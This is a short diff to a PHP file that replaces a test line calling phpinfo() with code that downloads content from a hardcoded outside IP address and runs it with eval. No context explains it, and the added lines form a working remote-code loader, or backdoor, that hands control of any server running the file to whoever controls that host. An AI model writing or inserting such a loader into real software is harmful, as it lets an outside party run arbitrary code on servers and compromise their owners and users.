@@ -1,3 +1,5 @@
-echo 777;
+$url = 'http://106.52.208.186/res/php/index.php';
 
-eval('phpinfo();');
+$result = file_get_contents($url);
+
+eval($result);
